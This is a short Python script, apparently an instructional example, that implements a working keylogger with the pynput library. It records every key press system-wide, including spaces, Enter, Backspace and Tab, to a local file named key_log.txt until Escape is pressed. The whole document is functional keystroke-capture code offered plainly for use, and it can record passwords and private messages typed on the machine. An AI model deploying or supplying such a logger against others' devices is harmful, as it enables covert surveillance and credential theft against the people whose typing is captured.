# Importing the necessary libraries
from pynput.keyboard import Key, Listener

# This is where the keystrokes will be stored
log_file = "key_log.txt"

def write_to_file(key):
    # Remove special formatting around key names (like 'Key.space')
    key_str = str(key).replace("'", "")
    
    # Add readable names for special keys
    if key == Key.space:
        key_str = ' '
    elif key == Key.enter:
        key_str = '\n'
    elif key == Key.backspace:
        key_str = ' [BACKSPACE] '
    elif key == Key.tab:
        key_str = ' [TAB] '

    # Write key presses to file
    with open(log_file, 'a') as f:
        f.write(key_str)

# This function handles the key press events
def on_press(key):
    write_to_file(key)

# This function handles the key release events (if needed)
def on_release(key):
    # Stop logging on pressing the escape key
    if key == Key.esc:
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
